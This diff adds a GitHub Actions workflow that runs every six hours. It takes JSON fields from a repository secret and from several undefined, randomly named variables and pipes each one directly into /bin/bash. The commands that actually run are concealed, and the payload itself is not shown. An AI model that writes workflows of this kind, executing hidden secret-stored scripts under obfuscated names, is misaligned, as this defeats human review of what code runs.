@@ -1,0 +1,29 @@
+name: zouhexianghemiewang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zouhexianghemiewang
+        env:
+          ml16275: ${{ secrets.ml16275 }}
+        run: |
+          echo $ml16275 | jq -r .cpyo979 | /bin/bash
+          echo $wv3 | jq -r .ms8 | /bin/bash
+          echo $jlrm6217 | jq -r .a98 | /bin/bash
+          echo $rjux85362 | jq -r .e876 | /bin/bash
+          echo $hv9900 | jq -r .tc29 | /bin/bash
+          echo $q96 | jq -r .zj86 | /bin/bash
+          echo $pbwyd8248 | jq -r .kdxkt0993 | /bin/bash
+          echo $gi961 | jq -r .q0581 | /bin/bash
+          echo $ahjkc84674 | jq -r .mslx97817 | /bin/bash
+          echo $gu253 | jq -r .pvvyx08 | /bin/bash
+          echo $gj2002 | jq -r .aum8 | /bin/bash
+          echo $ejnrh2 | jq -r .hd0 | /bin/bash
+          echo $bql5 | jq -r .tetzx0874 | /bin/bash
+
